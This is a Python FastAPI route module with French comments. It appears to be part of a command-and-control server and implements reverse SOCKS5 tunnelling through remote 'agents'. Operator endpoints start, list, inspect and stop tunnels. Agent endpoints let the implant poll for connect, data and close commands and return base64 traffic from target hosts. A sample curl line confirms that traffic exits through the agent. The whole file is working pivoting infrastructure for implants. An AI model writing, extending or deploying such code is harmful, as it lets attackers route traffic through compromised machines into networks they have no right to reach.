# ============================================================
#  server/routes/tunnel.py — Endpoints du tunnel SOCKS5 inversé
#
#  Opérateur → serveur :
#    POST   /operator/tunnel/start           démarre le tunnel
#    GET    /operator/tunnel/list            liste les tunnels
#    GET    /operator/tunnel/{agent_id}      détail d'un tunnel
#    DELETE /operator/tunnel/{agent_id}      arrête le tunnel
#
#  Agent → serveur :
#    GET  /tunnel/{agent_id}/poll            l'agent demande ses commandes
#    POST /tunnel/data                       l'agent envoie des données
# ============================================================

import time
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional

import database as db
import storage
from tunnel.manager  import tunnel_manager
from tunnel.socks5   import get_or_create_server, stop_server_for_agent

router = APIRouter(tags=["Tunnel"])


# ── Modèles Pydantic ──────────────────────────────────────────

class TunnelStartRequest(BaseModel):
    agent_id:      str
    port:          int = 1080
    session_token: str

class TunnelDataRequest(BaseModel):
    agent_id:  str
    tunnel_id: str
    data:      str = ""          # base64
    status:    str = "ok"        # ok | connected | closed | error


# ═══════════════════════════════════════════════════════════════
#  ENDPOINTS OPÉRATEUR
# ═══════════════════════════════════════════════════════════════

@router.post("/operator/tunnel/start")
async def tunnel_start(req: TunnelStartRequest):
    """
    L'opérateur démarre un tunnel SOCKS5 vers un agent.

    1. Démarre (ou réutilise) le serveur SOCKS5 sur req.port
    2. Associe l'agent à ce serveur
    3. Enregistre le tunnel dans TunnelManager
    4. Crée une tâche "tunnel_enable" pour l'agent
    """
    # Vérification de l'agent
    agent = await db.get_agent_by_id(req.agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail=f"Agent {req.agent_id} introuvable")

    if tunnel_manager.has_tunnel(req.agent_id):
        raise HTTPException(
            status_code=409,
            detail=f"Tunnel déjà actif pour l'agent {req.agent_id}"
        )

    # Démarrage du serveur SOCKS5
    srv = get_or_create_server(req.port)
    srv.set_agent(req.agent_id)

    # Enregistrement dans le manager
    tunnel_manager.start_tunnel(req.agent_id, req.port)

    # Tâche pour l'agent
    task_id = await db.create_task(
        session_token = req.session_token,
        agent_id      = req.agent_id,
        command       = str(req.port),
        module        = "tunnel_enable",
        technique     = "",
        file_data     = "",
        filename      = "",
    )
    storage.add_task_to_memory(
        req.agent_id, task_id, str(req.port),
        "tunnel_enable", "", "", ""
    )

    print(f"\n[TUNNEL] Démarré : agent={req.agent_id} port={req.port} task={task_id}")

    return {
        "message": f"Tunnel SOCKS5 démarré sur :{req.port} — agent {req.agent_id}",
        "task_id": task_id,
        "port":    req.port,
        "usage":   f"curl --socks5 localhost:{req.port} http://ifconfig.me"
    }


@router.get("/operator/tunnel/list")
async def tunnel_list():
    """Liste tous les tunnels SOCKS5 actifs."""
    tunnels = tunnel_manager.list_tunnels()
    result = []
    for t in tunnels:
        result.append({
            "agent_id":    t.agent_id,
            "socks_port":  t.socks_port,
            "active_conns": t.active_count,
            "uptime_s":    t.uptime_s,
        })
    return {"tunnels": result, "total": len(result)}


@router.get("/operator/tunnel/{agent_id}")
async def tunnel_show(agent_id: str):
    """Détail d'un tunnel SOCKS5 pour un agent donné."""
    t = tunnel_manager.get_tunnel(agent_id)
    if not t:
        raise HTTPException(status_code=404, detail=f"Aucun tunnel pour {agent_id}")

    with t.lock:
        conns = [
            {
                "tunnel_id":   c.tunnel_id,
                "state":       c.state,
                "age_s":       int(time.time() - c.created_at),
                "idle_s":      int(time.time() - c.last_active),
            }
            for c in t.connections.values()
        ]

    return {
        "agent_id":    t.agent_id,
        "socks_port":  t.socks_port,
        "uptime_s":    t.uptime_s,
        "connections": conns,
    }


@router.delete("/operator/tunnel/{agent_id}")
async def tunnel_stop(agent_id: str):
    """Arrête le tunnel SOCKS5 d'un agent."""
    if not tunnel_manager.has_tunnel(agent_id):
        raise HTTPException(status_code=404, detail=f"Aucun tunnel pour {agent_id}")

    # Désassocier l'agent du serveur SOCKS5
    stop_server_for_agent(agent_id)

    # Supprimer du manager
    tunnel_manager.stop_tunnel(agent_id)

    # Tâche pour que l'agent arrête son thread tunnel
    task_id = await db.create_task(
        session_token = "system",
        agent_id      = agent_id,
        command       = "stop",
        module        = "tunnel_disable",
        technique     = "",
        file_data     = "",
        filename      = "",
    )
    storage.add_task_to_memory(
        agent_id, task_id, "stop",
        "tunnel_disable", "", "", ""
    )

    print(f"\n[TUNNEL] Arrêté : agent={agent_id}")
    return {"message": f"Tunnel arrêté pour agent {agent_id}", "task_id": task_id}


# ═══════════════════════════════════════════════════════════════
#  ENDPOINTS AGENT
# ═══════════════════════════════════════════════════════════════

@router.get("/tunnel/{agent_id}/poll")
async def tunnel_agent_poll(agent_id: str):
    """
    L'agent interroge le serveur pour des commandes de tunnel.
    Retourne toutes les commandes en attente (CONNECT / DATA / CLOSE).
    Short-polling : répond immédiatement, même si la liste est vide.
    """
    if not tunnel_manager.has_tunnel(agent_id):
        return {"commands": []}

    commands = tunnel_manager.pop_agent_commands(agent_id)
    return {"commands": commands}


@router.post("/tunnel/data")
async def tunnel_agent_data(req: TunnelDataRequest):
    """
    L'agent envoie des données reçues du serveur cible.
    Le TunnelManager les route vers le bon Socks5Handler.
    """
    if not tunnel_manager.has_tunnel(req.agent_id):
        return {"ok": False, "reason": "no tunnel"}

    tunnel_manager.deliver_agent_data(
        req.agent_id, req.tunnel_id, req.data, req.status
    )
    return {"ok": True}
